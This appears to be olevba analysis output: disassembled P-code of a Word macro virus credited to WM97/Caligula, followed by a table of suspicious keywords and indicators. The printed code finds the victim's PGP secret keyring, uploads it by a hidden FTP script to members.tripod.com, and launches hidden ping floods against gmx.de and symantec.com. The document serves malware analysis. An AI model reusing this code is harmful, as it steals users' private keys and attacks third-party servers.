' 	Ld svt$ 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x002A ", AddToRecentFiles:=False, WritePassword:="
' 	ParamNamed Password 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #174:
' 	LitStr 0x0002 "r:"
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #175:
' 	Ld svt$ 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x002A ", AddToRecentFiles:=False, WritePassword:="
' 	ParamNamed Password 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #176:
' 	LitStr 0x0002 "s:"
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #177:
' 	Ld svt$ 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x002A ", AddToRecentFiles:=False, WritePassword:="
' 	ParamNamed Password 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #178:
' Line #179:
' 	QuoteRem 0x0000 0x002E "taken from WM97/Caligula by Opic[CodeBreakers]"
' Line #180:
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0008 "Nihilit3"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #181:
' Line #182:
' 	LitStr 0x0000 ""
' 	LitStr 0x0037 "HKEY_CLASSES_ROOT\PGP Encrypted File\shell\open\command"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St pgppath 
' Line #183:
' 	LitDI2 0x0001 
' 	Ld pgppath 
' 	LitStr 0x0004 "pgpt"
' 	FnInStr3 
' 	St Position 
' Line #184:
' Line #185:
' 	Ld Position 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #186:
' 	Ld pgppath 
' 	LitDI2 0x0001 
' 	Ld Position 
' 	LitDI2 0x0002 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St pgppath 
' Line #187:
' 	ElseBlock 
' Line #188:
' 	GoTo noPGP 
' Line #189:
' 	EndIfBlock 
' Line #190:
' Line #191:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #192:
' 	LitStr 0x000C "\Secring.skr"
' 	MemStWith FileName 
' Line #193:
' 	Ld pgppath 
' 	MemStWith LookIn 
' Line #194:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #195:
' 	LitVarSpecial (True)
' 	MemStWith MatchTextExactly 
' Line #196:
' 	Ld msoFileTypeAllFiles 
' 	MemStWith FileType 
' Line #197:
' 	ArgsMemCallWith Execute 0x0000 
' Line #198:
' 	LitDI2 0x0001 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	St PGP_Sec_Key 
' Line #199:
' 	EndWith 
' Line #200:
' Line #201:
' 	ArgsCall Read 0x0000 
' Line #202:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #203:
' 	Ld NewSecRingFile 
' 	LitDI2 0x0008 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	ArgsLd Str 0x0001 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St NewSecRingFile 
' Line #204:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #205:
' 	LitStr 0x0009 "./secring"
' 	Ld NewSecRingFile 
' 	Concat 
' 	LitStr 0x0004 ".skr"
' 	Concat 
' 	St NewSecRingFile 
' Line #206:
' Line #207:
' 	LitStr 0x000A "c:\sys.vxd"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #208:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0026 "ftp http://members.tripod.com/Nihilit/"
' 	PrintItemNL 
' Line #209:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "user nihilit"
' 	PrintItemNL 
' Line #210:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "pass killer"
' 	PrintItemNL 
' Line #211:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "cd incoming"
' 	PrintItemNL 
' Line #212:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "binary"
' 	PrintItemNL 
' Line #213:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "put ""
' 	Ld PGP_Sec_Key 
' 	Concat 
' 	LitStr 0x0003 "" ""
' 	Concat 
' 	Ld NewSecRingFile 
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	PrintItemNL 
' Line #214:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "quit"
' 	PrintItemNL 
' Line #215:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #216:
' Line #217:
' 	LitStr 0x0027 "command.com /c ftp.exe -n -s:c:\sys.vxd"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #218:
' Line #219:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0008 "Nihilit3"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #220:
' Line #221:
' 	EndIfBlock 
' Line #222:
' Line #223:
' 	Label noPGP 
' Line #224:
' 	LitStr 0x001B " ping -l 5000 -t www.gmx.de"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #225:
' 	LitStr 0x0021 " ping -l 5000 -t www.symantec.com"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #226:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://members.tripo|URL                                          |
|          |d.com/Nihilit/      |                                             |
|IOC       |ftp.exe             |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

